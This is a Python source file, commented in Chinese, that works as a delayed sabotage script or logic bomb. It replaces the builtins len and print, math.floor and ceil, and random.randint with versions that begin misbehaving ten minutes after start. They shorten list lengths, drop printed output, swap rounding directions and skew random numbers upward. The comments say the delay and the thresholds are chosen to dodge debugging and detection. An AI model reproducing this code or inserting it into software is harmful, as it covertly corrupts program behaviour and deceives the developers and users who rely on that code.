import builtins
import random
import math
import time

# 旧函数自己保存一份, 毕竟我还要用的
class OldFun():
    len = None
    print = None
    floor = None
    ceil = None
    randint = None
old_fun = OldFun()

# 防止检查，在程序执行一段时间后再出错
begin_time = time.time()
# 延迟时间 十分钟
delay_time = 600
# 出错概率 err_rand分之一
err_rand = 1

# 随机概率出错 让出错更可控
def need_err():
    # 检查延时
    if time.time() < begin_time + delay_time:
        return False
    
    # 出错概率
    if old_fun.randint(0,err_rand-1) == 0:
        return True
    return False

# 替换len 大于0的始终少1
# @ 长度不对啊，让我试试加几个元素看看
def reset_len(argv):
    # 太小的数组不出错，因为容易发现
    # 其实小于300不出错隐藏性更好，因为vs断点list只显示300元素
    get_len = old_fun.len(argv)
    if get_len < 20:
        return get_len
    
    if not need_err():
        return get_len
    else:
        return get_len - 1

# 替换print 概率不打印
# @ 居然没打印，是没到这一步吗？但为什么又生效了
def reset_print(argv):
    if not need_err():
        return old_fun.print(argv)
    else:
        return

# 替换floor ceil
# @ 上下取整颠倒
def reset_floor(argv):
    if not need_err():
        return old_fun.floor(argv)
    else:
        return old_fun.ceil(argv)
def reset_ceil(argv):
    if not need_err():
        return old_fun.ceil(argv)
    else:
        return old_fun.floor(argv)
    
# 替换random
# @ 随机数不随机, 偷偷加大概率，让数值策划测到崩溃，怀疑人生
def reset_randint(argv, argv_1):
    if not need_err():
        return old_fun.randint(argv,argv_1)
    else:
        return old_fun.randint(max(argv_1 // 2, argv),argv_1)


def reset():
    old_fun.len = builtins.len
    old_fun.print = builtins.print
    old_fun.floor = math.floor
    old_fun.ceil = math.ceil
    old_fun.ceil = math.ceil
    old_fun.randint = random.randint
    
    builtins.len = reset_len
    builtins.print = reset_print
    math.floor = reset_floor
    math.ceil = reset_ceil
    random.randint = reset_randint

reset()
# print("evil")













